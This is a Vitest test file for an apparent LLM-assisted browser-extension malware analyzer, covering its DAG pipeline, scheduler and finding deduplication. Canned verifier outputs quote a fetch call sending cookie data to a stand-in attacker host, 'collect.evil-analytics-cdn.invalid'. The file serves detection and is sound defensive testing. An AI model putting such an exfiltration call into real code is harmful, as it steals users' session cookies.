import { describe, it, expect } from "vitest";
import { analyzeCorpus } from "../scripts/analyze-corpus.ts";
import { FakeLlmClient } from "../src/llm/fake.ts";
import { createDag } from "../src/methodologies/dag/index.ts";
import { runDag } from "../src/methodologies/dag/scheduler.ts";
import { dedupeFindings, type DagTrace } from "../src/methodologies/dag/collect.ts";
import { okResult, ZERO_USAGE, type DagNode, type NodeContext } from "../src/methodologies/dag/node.ts";
import type { VerifierVerdict } from "../src/methodologies/claim-verifier.ts";
import type { Finding } from "../src/methodologies/findings.ts";
import type { EvidencePack } from "../src/pipeline/schema.ts";

const results = analyzeCorpus("corpus", { analyzedAt: "2026-01-01T00:00:00Z" });
const packs = new Map(results.map((r) => [r.sample, r.pack]));
const pack = (s: string): EvidencePack => packs.get(s)!;
const SAMPLE = "mutant-a-exfil-fetch";
const SAMPLE_DIR = `corpus/${SAMPLE}/extension`;

// ---- canned node completions for the end-to-end run ----

const PERM_JSON = JSON.stringify({
  judgments: [
    { permission: "cookies", judgment: "unjustified", reasoning: "a cookie editor has no reason to read cookies for export" },
    { permission: "tabs", judgment: "justified", reasoning: "needed for the active tab" },
    { permission: "storage", judgment: "justified", reasoning: "stores settings" },
  ],
});
const DEST_JSON = JSON.stringify({
  classifications: [
    { host: "collect.evil-analytics-cdn.invalid", classification: "suspicious", reasoning: "unrelated analytics endpoint" },
    { host: "demo-cookies.example", classification: "expected-for-purpose", reasoning: "the product site" },
    { host: "google.com", classification: "infrastructure", reasoning: "common service" },
  ],
});
const CONFIRMED_JSON = JSON.stringify({
  verdict: "confirmed",
  grounding_line: { file: "js/background.js", line: 197 },
  rationale: "the fetch call sends cookie data to the external host",
  evidence_quote: 'fetch("https://collect.evil-analytics-cdn.invalid", …)',
});
const SYNTHESIS_JSON = JSON.stringify({
  layperson_summary: "Manages cookies but also sends them to an outside server.",
  technical_summary: "Verified cookie exfiltration via fetch (finding 1).",
  description_deviation: { deviates: true, note: "A cookie tool should not transmit cookie data externally." },
});

// The finding-challenger re-examines the confirmed exfil finding with its own
// label; here it upholds (tries to refute, cannot).
const CHALLENGE_UPHOLD_JSON = JSON.stringify({
  verdict: "confirmed",
  grounding_line: { file: "js/background.js", line: 197 },
  rationale: "attempted to refute; the fetch genuinely transmits the cookie value",
  evidence_quote: 'fetch("https://collect.evil-analytics-cdn.invalid", …)',
});

function cannedClient(): FakeLlmClient {
  return new FakeLlmClient({
    "dag:permission-justification": { text: PERM_JSON, usage: { inputTokens: 10, outputTokens: 4 } },
    "dag:destination-reviewer": { text: DEST_JSON, usage: { inputTokens: 8, outputTokens: 3 } },
    "verify:claim": { text: CONFIRMED_JSON, usage: { inputTokens: 7, outputTokens: 3 } },
    "dag:finding-challenger": { text: CHALLENGE_UPHOLD_JSON, usage: { inputTokens: 5, outputTokens: 2 } },
    synthesize: { text: SYNTHESIS_JSON, usage: { inputTokens: 4, outputTokens: 2 } },
  });
}

describe("dag methodology (end to end over the shared backend)", () => {
  it("confirms the cookie→external flow as a verified behavior and decides high-risk via the deterministic verdict engine", async () => {
    const fake = cannedClient();
    const out = await createDag("test-model").run({ sampleDir: SAMPLE_DIR, pack: pack(SAMPLE) }, fake);

    // The deterministic verdict engine — NOT an LLM — owns the tier. A confirmed
    // high-severity behavior reaches high-risk.
    expect(out.tier).toBe("high-risk");
    expect(out.report).toContain("— verified behavior");
    expect(out.report).toContain("collect.evil-analytics-cdn.invalid");
    expect(out.report).toContain("**confirmed** at `js/background.js:197`");

    // Destinations the model does NOT affirmatively flag as suspicious (here the
    // unclassified demo-cookies.example / google.com, which default to "unknown") are
    // dismissed, not emitted as findings — this guards the destination-reviewer
    // false positive that turned every bare/unexplained destination into a
    // data-exfiltration finding. The real exfil host (collect.evil) is still
    // caught, by taint-flow-reviewer's verified behavior above.
    expect(out.report).not.toContain("Unexplained destination");
    expect(out.report.toLowerCase()).toContain("cookies");

    // Every node ran through the same labels we fan out on.
    const labels = fake.calls.map((c) => c.label).sort();
    expect(labels).toContain("dag:permission-justification");
    expect(labels).toContain("dag:destination-reviewer");
    expect(labels).toContain("verify:claim");
    expect(labels).toContain("dag:finding-challenger");
    expect(labels).toContain("synthesize");
    // The finding upheld by the challenger is still asserted as verified behavior.
    expect(out.report).toContain("— verified behavior");
  });

  it("records every node in the structured trace with its status", async () => {
    const out = await createDag("test-model").run({ sampleDir: SAMPLE_DIR, pack: pack(SAMPLE) }, cannedClient());
    const trace = out.structured as DagTrace;
    const byId = new Map(trace.nodes.map((n) => [n.id, n]));
    expect(byId.get("risk-classifier")?.status).toBe("ok");
    expect(byId.get("taint-flow-reviewer")?.status).toBe("ok");
    expect(byId.get("permission-justification")?.status).toBe("ok");
    expect(byId.get("destination-reviewer")?.status).toBe("ok");
    // The taint deep dive produced at least one confirmed verdict.
    expect(trace.verdicts.some((v) => v.verdict === "confirmed")).toBe(true);
  });
});

// ---- scheduler ----

function fakeNode(id: string, upstream: string[], opts: Partial<Pick<DagNode, "gate" | "run">> = {}): DagNode {
  return {
    id,
    version: "t",
    kind: "deterministic",
    sourceAccess: "none",
    upstream,
    gate: opts.gate ?? (() => true),
    run: opts.run ?? (async () => okResult({ usage: ZERO_USAGE })),
  };
}

const schedCtx: Omit<NodeContext, "upstream"> = {
  pack: {} as EvidencePack,
  sampleDir: "",
  listing: null, enrichment: null,
  client: new FakeLlmClient({}),
  model: "m",
  verifierModel: "m",
};

describe("dag scheduler", () => {
  it("runs in topological order, skips gated-off nodes, and captures errors without crashing", async () => {
    const order: string[] = [];
    const A = fakeNode("A", [], {
      run: async () => {
        order.push("A");
        return okResult({ usage: ZERO_USAGE, data: { v: 1 } });
      },
    });
    const B = fakeNode("B", ["A"], {
      run: async (c) => {
        order.push("B");
        expect((c.upstream.get("A")?.data as { v: number }).v).toBe(1); // sees upstream output
        return okResult({ usage: ZERO_USAGE });
      },
    });
    const C = fakeNode("C", ["A"], { gate: () => false });
    const D = fakeNode("D", [], {
      run: async () => {
        throw new Error("boom");
      },
    });

    const progress: string[] = [];
    const out = await runDag([A, B, C, D], { ...schedCtx, onProgress: async (stage, phase) => { progress.push(`${stage}/${phase}`); } });

    expect(order.indexOf("A")).toBeLessThan(order.indexOf("B")); // dependency respected
    expect(out.get("B")!.status).toBe("ok");
    expect(out.get("C")!.status).toBe("skipped");
    expect(out.get("C")!.reason).toBe("gate not met");
    expect(out.get("D")!.status).toBe("error");
    expect(out.get("D")!.reason).toContain("boom");
    expect(progress).toContain("dag:C/skipped");
    expect(progress).not.toContain("dag:C/started");
    expect(progress).toContain("dag:D/failed");
    expect(progress.indexOf("dag:A/finished")).toBeLessThan(progress.indexOf("dag:B/started"));
  });

  it("throws on an unsatisfiable dependency cycle", async () => {
    const X = fakeNode("X", ["Y"]);
    const Y = fakeNode("Y", ["X"]);
    await expect(runDag([X, Y], schedCtx)).rejects.toThrow(/cycle|unresolved/);
  });
});

// ---- verdict-aware dedup ----

function f(id: string, claim_type: Finding["claim_type"], file: string, line: number, severity: Finding["severity"]): Finding {
  return {
    id,
    title: id,
    claim_type,
    severity,
    category: "data-exfiltration",
    finding_type: "unknown",
    confidence: "medium",
    claimed_mechanism: claim_type === "inferred-behavior" ? "does X" : "",
    evidence_refs: [{ file, location: { line }, symbol: null, sink_or_string: "fetch" }],
    detail: "",
  };
}
function verdict(id: string, v: VerifierVerdict["verdict"]): VerifierVerdict {
  return { claim_id: id, verdict: v, grounding_line: null, rationale: "", evidence_quote: "", harm_supported: null, harm_rationale: "", corrected_facts: [] };
}

describe("dedupeFindings (verdict-aware subsumption)", () => {
  it("a confirmed behavior subsumes observed capabilities at the same source site", () => {
    const findings = [f("taint:0", "inferred-behavior", "a.js", 10, "high"), f("dest:0", "observed-capability", "a.js", 10, "medium")];
    const kept = dedupeFindings(findings, new Map([["taint:0", verdict("taint:0", "confirmed")]]));
    expect(kept.map((x) => x.id)).toEqual(["taint:0"]);
  });

  it("a non-confirmed behavior subsumes nothing — the capability at that site survives", () => {
    const findings = [f("taint:0", "inferred-behavior", "a.js", 10, "high"), f("dest:0", "observed-capability", "a.js", 10, "medium")];
    const kept = dedupeFindings(findings, new Map([["taint:0", verdict("taint:0", "refuted")]]));
    expect(kept.map((x) => x.id).sort()).toEqual(["dest:0", "taint:0"]);
  });

  it("keeps findings at distinct sites and ungrounded loners", () => {
    const loner: Finding = { ...f("perm:1", "observed-capability", "manifest.json", 0, "low"), evidence_refs: [{ file: "manifest.json", location: null, symbol: null, sink_or_string: "cookies" }] };
    const findings = [f("dest:0", "observed-capability", "a.js", 10, "medium"), f("dest:1", "observed-capability", "b.js", 20, "low"), loner];
    const kept = dedupeFindings(findings, new Map());
    expect(kept.map((x) => x.id).sort()).toEqual(["dest:0", "dest:1", "perm:1"]);
  });

  it("a confirmed-but-harm-CLEARED behavior does NOT subsume the co-sited capability (018 recall fix)", () => {
    // The confirmed claim is harm-cleared → routed to dismissals, never asserted.
    // If it subsumed the capability, the floor-eligible capability would vanish
    // entirely (neither finding nor dismissal) — the minified remote-loader class.
    const findings = [f("taint:0", "inferred-behavior", "a.js", 1, "high"), f("rscript:1", "observed-capability", "a.js", 1, "high")];
    const kept = dedupeFindings(findings, new Map([["taint:0", { ...verdict("taint:0", "confirmed"), harm_supported: false }]]));
    expect(kept.map((x) => x.id).sort()).toEqual(["rscript:1", "taint:0"]);
  });
});
